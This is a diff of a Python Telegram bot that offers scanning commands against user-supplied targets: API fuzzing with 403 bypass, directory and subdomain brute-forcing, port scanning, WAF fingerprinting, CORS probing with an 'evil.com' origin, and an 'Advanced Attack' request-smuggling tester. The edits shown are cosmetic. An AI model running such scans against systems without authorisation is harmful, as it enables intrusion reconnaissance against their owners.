     # High-value targets
@@ -19364,7 +19614,7 @@ _FUZZER_PATHS = [
 ]
 
 async def cmd_api_fuzzer(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/api_fuzzer <url> - Advanced API Endpoint Discovery with 403 Bypass"""
+    """/api_fuzzer <url> — Advanced API Endpoint Discovery with 403 Bypass"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/api_fuzzer https://example.com`\n\n"
@@ -19381,7 +19631,7 @@ async def cmd_api_fuzzer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     root = f"{parsed.scheme}://{parsed.netloc}"
 
     msg = await update.effective_message.reply_text(
-        f"🚀 *API Fuzzer   `{domain}`*\n\n"
+        f"🚀 *API Fuzzer — `{domain}`*\n\n"
         f"⏳ Scanning `{len(_FUZZER_PATHS)}` paths with 403 bypass...\n"
         f"🔄 Progress: `0/{len(_FUZZER_PATHS)}`",
         parse_mode='Markdown')
@@ -19448,7 +19698,7 @@ async def cmd_api_fuzzer(update: Update, context: ContextTypes.DEFAULT_TYPE):
             # Update progress
             try:
                 await msg.edit_text(
-                    f"🚀 *API Fuzzer   `{domain}`*\n\n"
+                    f"🚀 *API Fuzzer — `{domain}`*\n\n"
                     f"🔄 Progress: `{done[0]}/{len(_FUZZER_PATHS)}`\n"
                     f"✅ Found: `{len(found_200)}` | 🔐 Auth: `{len(found_auth)}` | "
                     f"🚫 403: `{len(found_403)}` | 💀 Leaks: `{len(found_leak)}`",
@@ -19459,7 +19709,7 @@ async def cmd_api_fuzzer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Build final report
     lines = [
         f"🚀 *API Fuzzer Report: `{domain}`*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"📊 Scanned: `{len(_FUZZER_PATHS)}` | Errors: `{errors}`",
         "",
     ]
@@ -19467,25 +19717,25 @@ async def cmd_api_fuzzer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if found_leak:
         lines.append("💀 *CONFIG / DATA LEAKS:*")
         for e in found_leak[:10]:
-            lines.append(f"  🔴 `{e['path']}`   `{e['preview'][:60]}`")
+            lines.append(f"  🔴 `{e['path']}` — `{e['preview'][:60]}`")
         lines.append("")
 
     if found_200:
         lines.append(f"✅ *ACCESSIBLE ENDPOINTS ({len(found_200)}):*")
         for e in found_200[:20]:
-            lines.append(f"  🟢 `{e['path']}`   `{e['type']}` ({e.get('size',0)} bytes)")
+            lines.append(f"  🟢 `{e['path']}` — `{e['type']}` ({e.get('size',0)} bytes)")
         lines.append("")
 
     if found_auth:
         lines.append(f"🔐 *AUTH REQUIRED ({len(found_auth)}):*")
         for e in found_auth[:10]:
-            lines.append(f"  🟡 `{e['path']}`   `401 Unauthorized`")
+            lines.append(f"  🟡 `{e['path']}` — `401 Unauthorized`")
         lines.append("")
 
     if found_403:
-        lines.append(f"🚫 *BLOCKED   403 ({len(found_403)}):*")
+        lines.append(f"🚫 *BLOCKED — 403 ({len(found_403)}):*")
         for e in found_403[:10]:
-            lines.append(f"  🔴 `{e['path']}`   Bypass failed")
+            lines.append(f"  🔴 `{e['path']}` — Bypass failed")
         lines.append("")
 
     if not any([found_200, found_auth, found_403, found_leak]):
@@ -19495,10 +19745,10 @@ async def cmd_api_fuzzer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 3️⃣  /password_leak_check   Real Breach Detection
+# ══════════════════════════════════════════════════
+# 3️⃣  /password_leak_check — Real Breach Detection
 #     Uses Have I Been Pwned k-Anonymity API (free, no key needed)
-# ==================================================
+# ══════════════════════════════════════════════════
 
 async def _check_hibp_password(password: str) -> tuple:
     """Check password against HIBP Pwned Passwords using k-Anonymity model."""
@@ -19525,7 +19775,7 @@ async def _check_email_breaches(email: str) -> list:
     """Check email against multiple free breach-check APIs."""
     breaches = []
 
-    # Method 1: Have I Been Pwned (public   limited without API key)
+    # Method 1: Have I Been Pwned (public — limited without API key)
     try:
         resp = await asyncio.to_thread(
             lambda: requests.get(
@@ -19632,14 +19882,14 @@ async def _check_domain_breaches(domain: str) -> dict:
 
 
 async def cmd_password_leak_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/password_leak_check <email|password|domain> - Comprehensive Breach Detection"""
+    """/password_leak_check <email|password|domain> — Comprehensive Breach Detection"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Password & Data Leak Checker*\n\n"
             "*Usage:*\n"
-            "  `/password_leak_check user@email.com`   Email breach check\n"
-            "  `/password_leak_check MyP@ssw0rd`   Password leak check\n"
-            "  `/password_leak_check example.com`   Domain breach scan\n\n"
+            "  `/password_leak_check user@email.com` — Email breach check\n"
+            "  `/password_leak_check MyP@ssw0rd` — Password leak check\n"
+            "  `/password_leak_check example.com` — Domain breach scan\n\n"
             "🔒 _Password စစ်ဆေးမှုတွင် k-Anonymity model သုံးထားသဖြင့်\n"
             "သင့် password ကို server ဆီ တိုက်ရိုက် မပို့ပါ။_",
             parse_mode='Markdown')
@@ -19653,7 +19903,7 @@ async def cmd_password_leak_check(update: Update, context: ContextTypes.DEFAULT_
 
     lines = [
         f"🔐 *Breach Report: `{target}`*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         "",
     ]
 
@@ -19671,7 +19921,7 @@ async def cmd_password_leak_check(update: Update, context: ContextTypes.DEFAULT_
         lines.append("")
 
         if breaches:
-            lines.append(f"⚠️ *BREACHED   Found in `{len(breaches)}` data breaches:*")
+            lines.append(f"⚠️ *BREACHED — Found in `{len(breaches)}` data breaches:*")
             lines.append("")
             for i, b in enumerate(breaches[:15], 1):
                 lines.append(f"  {i}. 🔴 `{b}`")
@@ -19729,7 +19979,7 @@ async def cmd_password_leak_check(update: Update, context: ContextTypes.DEFAULT_
         lines.append("")
 
         if is_leaked:
-            lines.append(f"⚠️ *LEAKED   ဒီ password ကို `{count:,}` ကြိမ် ပေါက်ကြားခဲ့ပါသည်!*")
+            lines.append(f"⚠️ *LEAKED — ဒီ password ကို `{count:,}` ကြိမ် ပေါက်ကြားခဲ့ပါသည်!*")
             lines.append("")
             lines.append("🛡️ *Recommendations:*")
             lines.append("  ├ ဒီ password ကို ချက်ချင်း မသုံးပါနဲ့")
@@ -19746,12 +19996,12 @@ async def cmd_password_leak_check(update: Update, context: ContextTypes.DEFAULT_
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 4️⃣  /site_map   Sitemap Discovery & Crawler
-# ==================================================
+# ══════════════════════════════════════════════════
+# 4️⃣  /site_map — Sitemap Discovery & Crawler
+# ══════════════════════════════════════════════════
 
 async def cmd_site_map(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/site_map <url> - Discover and parse sitemap.xml"""
+    """/site_map <url> — Discover and parse sitemap.xml"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -19770,7 +20020,7 @@ async def cmd_site_map(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = parsed.netloc
 
     msg = await update.effective_message.reply_text(
-        f"🗺️ *Sitemap Discovery   `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
+        f"🗺️ *Sitemap Discovery — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
 
     sitemap_urls = [
         f'{root}/sitemap.xml', f'{root}/sitemap_index.xml',
@@ -19810,7 +20060,7 @@ async def cmd_site_map(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     lines = [
         f"🗺️ *Sitemap Report: `{domain}`*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         "",
     ]
 
@@ -19832,12 +20082,12 @@ async def cmd_site_map(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 5️⃣  /whois_lookup   Full WHOIS Information
-# ==================================================
+# ══════════════════════════════════════════════════
+# 5️⃣  /whois_lookup — Full WHOIS Information
+# ══════════════════════════════════════════════════
 
 async def cmd_whois_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/whois_lookup <domain> - Full WHOIS domain information"""
+    """/whois_lookup <domain> — Full WHOIS domain information"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -19850,7 +20100,7 @@ async def cmd_whois_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     domain = context.args[0].strip().replace('https://', '').replace('http://', '').split('/')[0]
     msg = await update.effective_message.reply_text(
-        f"🕵️ *WHOIS Lookup   `{domain}`*\n\n⏳ Querying...", parse_mode='Markdown')
+        f"🕵️ *WHOIS Lookup — `{domain}`*\n\n⏳ Querying...", parse_mode='Markdown')
 
     try:
         result = await asyncio.to_thread(
@@ -19878,7 +20128,7 @@ async def cmd_whois_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         lines = [
             f"🕵️ *WHOIS Report: `{domain}`*",
-            "--------------------",
+            "━━━━━━━━━━━━━━━━━━━━",
             "",
         ]
 
@@ -19912,12 +20162,12 @@ async def cmd_whois_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ *WHOIS Failed:* `{str(e)[:100]}`", parse_mode='Markdown')
 
 
-# ==================================================
-# 6️⃣  /dns_enum   DNS Enumeration
-# ==================================================
+# ══════════════════════════════════════════════════
+# 6️⃣  /dns_enum — DNS Enumeration
+# ══════════════════════════════════════════════════
 
 async def cmd_dns_enum(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/dns_enum <domain> - DNS record enumeration (A, AAAA, MX, NS, TXT, CNAME, SOA)"""
+    """/dns_enum <domain> — DNS record enumeration (A, AAAA, MX, NS, TXT, CNAME, SOA)"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -19930,7 +20180,7 @@ async def cmd_dns_enum(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     domain = context.args[0].strip().replace('https://', '').replace('http://', '').split('/')[0]
     msg = await update.effective_message.reply_text(
-        f"📡 *DNS Enumeration   `{domain}`*\n\n⏳ Querying records...", parse_mode='Markdown')
+        f"📡 *DNS Enumeration — `{domain}`*\n\n⏳ Querying records...", parse_mode='Markdown')
 
     record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
     results = {}
@@ -19950,7 +20200,7 @@ async def cmd_dns_enum(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     lines = [
         f"📡 *DNS Records: `{domain}`*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         "",
     ]
 
@@ -19972,9 +20222,9 @@ async def cmd_dns_enum(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 7️⃣  /port_scan   Common Port Scanner
-# ==================================================
+# ══════════════════════════════════════════════════
+# 7️⃣  /port_scan — Common Port Scanner
+# ══════════════════════════════════════════════════
 
 _COMMON_PORTS = {
     21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
@@ -19986,7 +20236,7 @@ _COMMON_PORTS = {
 }
 
 async def cmd_port_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/port_scan <domain/ip> - Scan common ports"""
+    """/port_scan <domain/ip> — Scan common ports"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -20001,7 +20251,7 @@ async def cmd_port_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     target = context.args[0].strip().replace('https://', '').replace('http://', '').split('/')[0]
     msg = await update.effective_message.reply_text(
-        f"🔌 *Port Scan   `{target}`*\n\n⏳ Scanning `{len(_COMMON_PORTS)}` ports...",
+        f"🔌 *Port Scan — `{target}`*\n\n⏳ Scanning `{len(_COMMON_PORTS)}` ports...",
         parse_mode='Markdown')
 
     # Resolve hostname
@@ -20034,7 +20284,7 @@ async def cmd_port_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lines = [
         f"🔌 *Port Scan Report: `{target}`*",
         f"📍 *IP:* `{ip}`",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"📊 Scanned: `{len(_COMMON_PORTS)}` | Open: `{len(open_ports)}` | Closed: `{closed}`",
         "",
     ]
@@ -20043,19 +20293,19 @@ async def cmd_port_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lines.append("✅ *Open Ports:*")
         for port, svc in open_ports:
             risk = "🔴" if port in (21, 23, 3389, 5900, 6379, 27017) else "🟢"
-            lines.append(f"  {risk} Port `{port}`   `{svc}`")
+            lines.append(f"  {risk} Port `{port}` — `{svc}`")
     else:
         lines.append("🔒 *All scanned ports are closed or filtered.*")
 
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 8️⃣  /ssl_check   SSL/TLS Certificate Analysis
-# ==================================================
+# ══════════════════════════════════════════════════
+# 8️⃣  /ssl_check — SSL/TLS Certificate Analysis
+# ══════════════════════════════════════════════════
 
 async def cmd_ssl_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/ssl_check <domain> - SSL/TLS certificate analysis"""
+    """/ssl_check <domain> — SSL/TLS certificate analysis"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -20068,7 +20318,7 @@ async def cmd_ssl_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     domain = context.args[0].strip().replace('https://', '').replace('http://', '').split('/')[0]
     msg = await update.effective_message.reply_text(
-        f"🔒 *SSL Check   `{domain}`*\n\n⏳ Analyzing certificate...", parse_mode='Markdown')
+        f"🔒 *SSL Check — `{domain}`*\n\n⏳ Analyzing certificate...", parse_mode='Markdown')
 
     try:
         import ssl as ssl_mod
@@ -20100,7 +20350,7 @@ async def cmd_ssl_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         lines = [
             f"🔒 *SSL/TLS Report: `{domain}`*",
-            "--------------------",
+            "━━━━━━━━━━━━━━━━━━━━",
             "",
         ]
 
@@ -20129,9 +20379,9 @@ async def cmd_ssl_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ *SSL Check Failed:* `{str(e)[:100]}`", parse_mode='Markdown')
 
 
-# ==================================================
-# 9️⃣  /headers_check   HTTP Security Headers Analysis
-# ==================================================
+# ══════════════════════════════════════════════════
+# 9️⃣  /headers_check — HTTP Security Headers Analysis
+# ══════════════════════════════════════════════════
 
 _SECURITY_HEADERS = {
     'strict-transport-security': ('HSTS', '🟢', '🔴'),
@@ -20147,7 +20397,7 @@ _SECURITY_HEADERS = {
 }
 
 async def cmd_headers_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/headers_check <url> - HTTP Security Headers Analysis"""
+    """/headers_check <url> — HTTP Security Headers Analysis"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -20164,7 +20414,7 @@ async def cmd_headers_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = urlparse(url).netloc
 
     msg = await update.effective_message.reply_text(
-        f"📄 *Security Headers Check   `{domain}`*\n\n⏳ Analyzing...", parse_mode='Markdown')
+        f"📄 *Security Headers Check — `{domain}`*\n\n⏳ Analyzing...", parse_mode='Markdown')
 
     try:
         resp = await asyncio.to_thread(
@@ -20174,7 +20424,7 @@ async def cmd_headers_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         lines = [
             f"📄 *Security Headers: `{domain}`*",
-            "--------------------",
+            "━━━━━━━━━━━━━━━━━━━━",
             f"🌐 Status: `{resp.status_code}` | Server: `{hdrs.get('server', 'Unknown')}`",
             "",
         ]
@@ -20213,9 +20463,9 @@ async def cmd_headers_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ *Headers Check Failed:* `{str(e)[:100]}`", parse_mode='Markdown')
 
 
-# ==================================================
-# 🔟  /waf_detect   WAF Detection & Identification
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔟  /waf_detect — WAF Detection & Identification
+# ══════════════════════════════════════════════════
 
 _WAF_SIGNATURES = {
     'Cloudflare': {'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id'], 'server': 'cloudflare', 'body': ['cloudflare']},
@@ -20233,7 +20483,7 @@ _WAF_SIGNATURES = {
 }
 
 async def cmd_waf_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/waf_detect <url> - Detect WAF/Firewall type"""
+    """/waf_detect <url> — Detect WAF/Firewall type"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -20250,7 +20500,7 @@ async def cmd_waf_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = urlparse(url).netloc
 
     msg = await update.effective_message.reply_text(
-        f"🛡️ *WAF Detection   `{domain}`*\n\n⏳ Fingerprinting firewall...", parse_mode='Markdown')
+        f"🛡️ *WAF Detection — `{domain}`*\n\n⏳ Fingerprinting firewall...", parse_mode='Markdown')
 
     try:
         # Normal request
@@ -20284,7 +20534,7 @@ async def cmd_waf_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if h in hdrs_lower or h in mal_hdrs:
                     score += 2
             # Check server
-            if sigs['server'] and sigs[\x27server\x27] in server:
+            if sigs['server'] and sigs['server'] in server:
                 score += 3
             # Check body
             for pattern in sigs['body']:
@@ -20297,7 +20547,7 @@ async def cmd_waf_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         lines = [
             f"🛡️ *WAF Detection: `{domain}`*",
-            "--------------------",
+            "━━━━━━━━━━━━━━━━━━━━",
             f"🌐 Normal Status: `{resp.status_code}` | Malicious Status: `{mal_status}`",
             f"📡 Server: `{server or 'Hidden'}`",
             "",
@@ -20307,14 +20557,14 @@ async def cmd_waf_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
             lines.append(f"🔥 *Detected WAF/Firewall ({len(detected_wafs)}):*")
             for waf, score in detected_wafs:
                 confidence = "High" if score >= 4 else "Medium" if score >= 2 else "Low"
-                lines.append(f"  🛡️ `{waf}`   Confidence: `{confidence}`")
+                lines.append(f"  🛡️ `{waf}` — Confidence: `{confidence}`")
             lines.append("")
             if mal_status in (403, 406, 429, 503):
                 lines.append(f"⚠️ *WAF actively blocking:* Malicious request returned `{mal_status}`")
         else:
             lines.append("✅ *No WAF detected.*")
             if mal_status == resp.status_code:
-                lines.append("_Malicious request was not blocked   no WAF protection._")
+                lines.append("_Malicious request was not blocked — no WAF protection._")
 
         await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
@@ -20322,12 +20572,12 @@ async def cmd_waf_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ *WAF Detection Failed:* `{str(e)[:100]}`", parse_mode='Markdown')
 
 
-# ==================================================
-# 1️⃣1️⃣  /cors_check   CORS Misconfiguration Scanner
-# ==================================================
+# ══════════════════════════════════════════════════
+# 1️⃣1️⃣  /cors_check — CORS Misconfiguration Scanner
+# ══════════════════════════════════════════════════
 
 async def cmd_cors_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/cors_check <url> - Check for CORS misconfigurations"""
+    """/cors_check <url> — Check for CORS misconfigurations"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -20344,7 +20594,7 @@ async def cmd_cors_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = urlparse(url).netloc
 
     msg = await update.effective_message.reply_text(
-        f"🔓 *CORS Check   `{domain}`*\n\n⏳ Testing CORS policy...", parse_mode='Markdown')
+        f"🔓 *CORS Check — `{domain}`*\n\n⏳ Testing CORS policy...", parse_mode='Markdown')
 
     test_origins = [
         'https://evil.com',
@@ -20371,7 +20621,7 @@ async def cmd_cors_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 desc = ''
                 if acao == '*':
                     vuln = True
-                    desc = 'Wildcard (*)   allows any origin'
+                    desc = 'Wildcard (*) — allows any origin'
                 elif acao == origin:
                     vuln = True
                     desc = f'Reflects origin: {origin}'
@@ -20393,7 +20643,7 @@ async def cmd_cors_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     lines = [
         f"🔓 *CORS Analysis: `{domain}`*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         "",
     ]
 
@@ -20414,9 +20664,9 @@ async def cmd_cors_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 1️⃣2️⃣  /dir_brute   Directory Brute-force Scanner
-# ==================================================
+# ══════════════════════════════════════════════════
+# 1️⃣2️⃣  /dir_brute — Directory Brute-force Scanner
+# ══════════════════════════════════════════════════
 
 _DIR_WORDLIST = [
     'admin', 'administrator', 'login', 'dashboard', 'panel', 'wp-admin',
@@ -20437,7 +20687,7 @@ _DIR_WORDLIST = [
 ]
 
 async def cmd_dir_brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/dir_brute <url> - Directory brute-force scanner"""
+    """/dir_brute <url> — Directory brute-force scanner"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -20457,7 +20707,7 @@ async def cmd_dir_brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = urlparse(url).netloc
 
     msg = await update.effective_message.reply_text(
-        f"📁 *Dir Brute   `{domain}`*\n\n⏳ Scanning `{len(_DIR_WORDLIST)}` paths...",
+        f"📁 *Dir Brute — `{domain}`*\n\n⏳ Scanning `{len(_DIR_WORDLIST)}` paths...",
         parse_mode='Markdown')
 
     found = []
@@ -20486,7 +20736,7 @@ async def cmd_dir_brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await asyncio.gather(*tasks, return_exceptions=True)
             try:
                 await msg.edit_text(
-                    f"📁 *Dir Brute   `{domain}`*\n\n"
+                    f"📁 *Dir Brute — `{domain}`*\n\n"
                     f"🔄 Progress: `{done[0]}/{len(_DIR_WORDLIST)}`\n"
                     f"✅ Found: `{len(found)}`",
                     parse_mode='Markdown')
@@ -20497,7 +20747,7 @@ async def cmd_dir_brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     lines = [
         f"📁 *Directory Scan: `{domain}`*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"📊 Scanned: `{len(_DIR_WORDLIST)}` | Found: `{len(found)}`",
         "",
     ]
@@ -20506,7 +20756,7 @@ async def cmd_dir_brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     for f in found[:30]:
         icon = status_icons.get(f['status'], '⚪')
-        lines.append(f"  {icon} `/{f['path']}`   `{f['status']}` ({f['size']} bytes)")
+        lines.append(f"  {icon} `/{f['path']}` — `{f['status']}` ({f['size']} bytes)")
 
     if not found:
         lines.append("❌ *No accessible directories found.*")
@@ -20514,9 +20764,9 @@ async def cmd_dir_brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 1️⃣3️⃣  /subdomain_enum   Subdomain Enumeration
-# ==================================================
+# ══════════════════════════════════════════════════
+# 1️⃣3️⃣  /subdomain_enum — Subdomain Enumeration
+# ══════════════════════════════════════════════════
 
 _SUBDOMAIN_WORDLIST = [
     'www', 'mail', 'ftp', 'admin', 'blog', 'shop', 'store', 'api',
@@ -20538,7 +20788,7 @@ _SUBDOMAIN_WORDLIST = [
 ]
 
 async def cmd_subdomain_enum(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/subdomain_enum <domain> - Subdomain enumeration via DNS brute-force"""
+    """/subdomain_enum <domain> — Subdomain enumeration via DNS brute-force"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/subdomain_enum example.com`\n\n"
@@ -20548,7 +20798,7 @@ async def cmd_subdomain_enum(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     domain = context.args[0].strip().replace('https://', '').replace('http://', '').split('/')[0]
     msg = await update.effective_message.reply_text(
-        f"🔎 *Subdomain Enum   `{domain}`*\n\n⏳ Resolving `{len(_SUBDOMAIN_WORDLIST)}` subdomains...",
+        f"🔎 *Subdomain Enum — `{domain}`*\n\n⏳ Resolving `{len(_SUBDOMAIN_WORDLIST)}` subdomains...",
         parse_mode='Markdown')
 
     found = []
@@ -20572,7 +20822,7 @@ async def cmd_subdomain_enum(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await asyncio.gather(*tasks, return_exceptions=True)
         try:
             await msg.edit_text(
-                f"🔎 *Subdomain Enum   `{domain}`*\n\n"
+                f"🔎 *Subdomain Enum — `{domain}`*\n\n"
                 f"🔄 Progress: `{done[0]}/{len(_SUBDOMAIN_WORDLIST)}`\n"
                 f"✅ Found: `{len(found)}`",
                 parse_mode='Markdown')
@@ -20581,7 +20831,7 @@ async def cmd_subdomain_enum(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     lines = [
         f"🔎 *Subdomain Report: `{domain}`*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"📊 Checked: `{len(_SUBDOMAIN_WORDLIST)}` | Found: `{len(found)}`",
         "",
     ]
@@ -20605,12 +20855,12 @@ async def cmd_subdomain_enum(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 1️⃣4️⃣  /cms_detect   CMS Version Detection
-# ==================================================
+# ══════════════════════════════════════════════════
+# 1️⃣4️⃣  /cms_detect — CMS Version Detection
+# ══════════════════════════════════════════════════
 
 async def cmd_cms_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/cms_detect <url> - Detect CMS type and version"""
+    """/cms_detect <url> — Detect CMS type and version"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/cms_detect https://example.com`", parse_mode='Markdown')
@@ -20624,7 +20874,7 @@ async def cmd_cms_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = parsed.netloc
 
     msg = await update.effective_message.reply_text(
-        f"📝 *CMS Detection   `{domain}`*\n\n⏳ Fingerprinting...", parse_mode='Markdown')
+        f"📝 *CMS Detection — `{domain}`*\n\n⏳ Fingerprinting...", parse_mode='Markdown')
 
     cms_results = []
 
@@ -20686,7 +20936,7 @@ async def cmd_cms_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     lines = [
         f"📝 *CMS Detection: `{domain}`*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         "",
     ]
 
@@ -20701,12 +20951,12 @@ async def cmd_cms_detect(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 1️⃣5️⃣  /speed_audit   Website Performance Audit
-# ==================================================
+# ══════════════════════════════════════════════════
+# 1️⃣5️⃣  /speed_audit — Website Performance Audit
+# ══════════════════════════════════════════════════
 
 async def cmd_speed_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/speed_audit <url> - Website loading speed and performance audit"""
+    """/speed_audit <url> — Website loading speed and performance audit"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/speed_audit https://example.com`", parse_mode='Markdown')
@@ -20718,7 +20968,7 @@ async def cmd_speed_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = urlparse(url).netloc
 
     msg = await update.effective_message.reply_text(
-        f"⚡ *Speed Audit   `{domain}`*\n\n⏳ Measuring performance...", parse_mode='Markdown')
+        f"⚡ *Speed Audit — `{domain}`*\n\n⏳ Measuring performance...", parse_mode='Markdown')
 
     try:
         # Measure response time
@@ -20786,7 +21036,7 @@ async def cmd_speed_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         lines = [
             f"⚡ *Speed Audit: `{domain}`*",
-            "--------------------",
+            "━━━━━━━━━━━━━━━━━━━━",
             f"📊 *Score:* `{score}/100` (Grade: `{grade}`)",
             "",
             "⏱️ *Timing:*",
@@ -20817,19 +21067,19 @@ async def cmd_speed_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ *Speed Audit Failed:* `{str(e)[:100]}`", parse_mode='Markdown')
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # ⚔️  v43.5 Advanced Attack (ATT) Functions
-# ==================================================
+# ══════════════════════════════════════════════════
 
 async def cmd_smuggling_tester(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/smuggling_tester <url> - HTTP Request Smuggling (CL.TE / TE.CL) Detection"""
+    """/smuggling_tester <url> — HTTP Request Smuggling (CL.TE / TE.CL) Detection"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
     if not allowed:
         await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown'); return
     if uid in _active_scans:
-        await update.effective_message.reply_text(f"⏳ `{_active_scans.get(uid)}` running   `/stop` နှိပ်ပါ", parse_mode='Markdown'); return
+        await update.effective_message.reply_text(f"⏳ `{_active_scans.get(uid)}` running — `/stop` နှိပ်ပါ", parse_mode='Markdown'); return
     if not context.args:
         await update.effective_message.reply_text("📌 *Usage:* `/smuggling_tester https://example.com`", parse_mode='Markdown'); return
     url = context.args[0].strip()
